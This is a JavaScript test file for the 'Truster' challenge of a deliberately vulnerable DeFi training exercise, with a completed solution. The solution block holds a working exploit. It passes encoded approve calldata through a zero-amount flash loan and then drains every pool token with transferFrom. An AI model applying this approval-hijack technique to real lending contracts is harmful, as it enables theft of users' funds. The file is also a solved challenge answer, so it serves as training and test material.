const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Truster", function () {
  let deployer, player;
  let token, pool;

  const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    pool = await (
      await ethers.getContractFactory("TrusterLenderPool", deployer)
    ).deploy(token.address);
    expect(await pool.token()).to.eq(token.address);

    await token.transfer(pool.address, TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

    expect(await token.balanceOf(player.address)).to.equal(0);
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */

    let ABI = ["function approve(address to, uint256 amount)"];
    let iface = new ethers.utils.Interface(ABI);
    const data = iface.encodeFunctionData("approve", [
      player.address,
      TOKENS_IN_POOL,
    ]);
    await pool.flashLoan(0, player.address, token.address, data); // Transfer 0 DVT loan to myself, but data approves DVT Token Contract to send TOKENS_IN_POOL to myself
    await token
      .connect(player) // Use Player Private Key to process DVT Token Contract transfer1From tx
      .transferFrom(pool.address, player.address, TOKENS_IN_POOL); // TransferFrom (approval) from DVT Token Contract to myself
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(0);
  });
});
